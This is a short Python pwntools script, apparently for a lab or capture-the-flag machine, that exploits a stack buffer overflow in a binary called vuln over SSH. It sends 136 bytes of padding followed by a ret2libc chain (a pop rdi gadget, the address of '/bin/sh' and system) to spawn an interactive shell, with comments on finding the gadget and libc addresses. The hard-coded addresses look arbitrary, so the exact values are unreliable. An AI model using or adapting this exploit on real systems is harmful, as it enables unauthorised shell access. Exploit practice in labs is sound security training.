from pwn import *

s = ssh(host = '10.10.10.139')
p = s.process('/usr/bin/vuln')
padding = ("A" * 136).encode()
#ropper --file vuln --search "pop rdi; ret;"
pop_rdi = p64(0x138C54A1) 
#Get these libc addresses from libc.so.6
#/usr/lib/x86_64-linux-gnu
#readelf -s libc.so.6 | grep system
libc_system = p64(0xAB765F80)
#strings -a -t x libc.so.6 | grep /bin/sh
libc_binsh = p64(0x5643AB89) 
log.info(f'System: {libc_system.hex()}')
log.info(f'/bin/sh: {libc_binsh.hex()}')
payload_rce = padding
payload_rce += pop_rdi + libc_binsh + libc_system
p.sendline(payload_rce)
p.interactive()
